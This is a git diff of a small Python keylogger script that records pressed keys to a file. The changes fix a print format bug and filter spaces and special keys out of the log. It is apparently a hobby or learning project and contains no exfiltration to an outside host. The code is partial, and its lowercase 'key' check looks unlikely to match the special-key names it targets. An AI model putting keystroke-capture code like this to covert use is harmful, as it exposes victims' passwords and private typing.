@@ -13,7 +13,7 @@ def on_press(key):
     keys.append(key)
     count += 1
     #log into console what keys are pressed
-    print("(0) pressed".format(key))
+    print("{0} pressed".format(key))
 #setting a "timer" so that when more than 10 keys are pressed it will write
     if count >= 10:
         count = 0
@@ -28,7 +28,10 @@ def write_file(keys):
             #find in the termnial for whenever Key.space is logged, if it does than log it as a new line
             if k.find("space") > 0:
                 f.write('\n')
-            f.write(str(key))
+            #find anything like key.backspace, key.esc and replaces it with k so it wont be recorded
+            elif k.find("key") == -1:
+                    f.write(k)
+            #f.write(str(key))
 
 #function to record when a key is released
 def on_release(key):
